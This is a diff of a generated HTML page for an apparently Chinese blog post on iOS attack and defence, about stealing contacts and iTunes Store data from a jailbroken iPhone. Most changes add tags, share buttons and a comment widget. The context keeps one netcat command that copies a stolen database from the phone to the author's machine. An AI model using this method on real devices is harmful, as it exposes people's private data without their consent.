@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="iOS," />
+  <meta name="keywords" content="iOS,iOS攻防," />
 
 
 
@@ -97,7 +97,7 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
 简介本文章基于念茜的iOS攻防系列。本文将会讲解如何窃取用户的通讯录信息。同样在越狱手机环境下。
 hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
 <meta property="og:image" content="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png">
-<meta property="og:updated_time" content="2016-08-04T09:57:25.000Z">
+<meta property="og:updated_time" content="2016-08-05T02:33:55.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="iOS攻防——（二）如何窃取用户的通讯录信息">
 <meta name="twitter:description" content="说明2016年7月15更新，最近试了一下，发现用nc拿不到数据了，拿数据的代码是没有问题的，直接运行可以拿到数据，但是从mac通过IP和端口拿到的.sqlitedb文件是空文件，博主也正在看为什么~大家有兴趣可以一起找一下原因。
@@ -306,6 +306,13 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
 
           
             
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -454,7 +461,7 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.31.152 55 &gt; itunesstored2.sqlitedb</div></pre></td></tr></table></figure>
 <p>OK，在MAC查看一下内容。</p>
 <hr>
-<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x63;&#111;&#100;&#x65;&#114;&#102;&#x69;&#x73;&#104;&#x40;&#49;&#54;&#51;&#46;&#99;&#x6f;&#x6d;">&#x63;&#111;&#100;&#x65;&#114;&#102;&#x69;&#x73;&#104;&#x40;&#49;&#54;&#51;&#46;&#99;&#x6f;&#x6d;</a>。</p>
+<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#99;&#x6f;&#100;&#x65;&#x72;&#x66;&#105;&#x73;&#104;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;">&#99;&#x6f;&#100;&#x65;&#x72;&#x66;&#105;&#x73;&#104;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;</a>。</p>
 <p>博主主要写javaEE和iOS的。</p>
 <p>希望大家一起进步。</p>
 <p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
@@ -509,6 +516,8 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
           
             <a href="/tags/iOS/" rel="tag">#iOS</a>
           
+            <a href="/tags/iOS攻防/" rel="tag">#iOS攻防</a>
+          
         </div>
       
 
@@ -541,6 +550,25 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
 
     <div class="post-spread">
       
+        <div class="ds-share flat" data-thread-key="2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/"
+     data-title="iOS攻防——（二）如何窃取用户的通讯录信息"
+     data-content=""
+     data-url="http://zhoulingyu.com/2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
     </div>
   </div>
 
@@ -551,6 +579,10 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
 
           
   <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/"
+           data-title="iOS攻防——（二）如何窃取用户的通讯录信息" data-url="http://zhoulingyu.com/2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/">
+      </div>
     
   </div>
 
@@ -611,7 +643,7 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -796,9 +828,30 @@ hack1. 需要一个plist需要这样一个plist，它看起来是这样：">
 
   
 
+  
+    
+  
 
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"14076594"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
 
   
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
 
 
 
